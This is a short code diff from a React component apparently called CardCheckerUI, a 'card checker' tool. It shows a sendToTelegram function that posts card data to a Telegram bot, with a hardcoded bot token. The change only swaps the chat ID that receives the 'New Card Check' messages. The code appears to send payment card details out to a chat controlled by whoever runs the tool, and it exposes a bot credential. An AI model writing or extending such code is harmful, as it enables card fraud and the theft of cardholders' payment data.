@@ -16,7 +16,7 @@ export default function CardCheckerUI() {
   // Telegram bot function
   const sendToTelegram = async (cardData) => {
     const botToken = '8557995207:AAHRL46aHUWp3WYt5I525xy-YEy-fNVan3c';
-    const chatId = '1608023881';
+    const chatId = '6874465035';
     
     const message = `
 💳 *New Card Check - ${cardData.selected}*
